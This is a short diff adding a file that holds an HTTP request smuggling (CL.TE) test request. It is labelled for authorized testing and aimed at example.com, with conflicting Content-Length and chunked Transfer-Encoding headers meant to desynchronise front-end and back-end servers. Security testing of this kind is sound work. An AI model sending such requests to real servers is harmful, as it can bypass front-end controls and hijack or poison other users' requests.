@@ -1,0 +1,12 @@
+# CL.TE example (for authorized testing only)
+# Front-end honors Content-Length; back-end honors Transfer-Encoding
+
+POST https://example.com/any-endpoint HTTP/1.1
+Host: example.com
+Content-Length: 6
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+0
+
+X=1
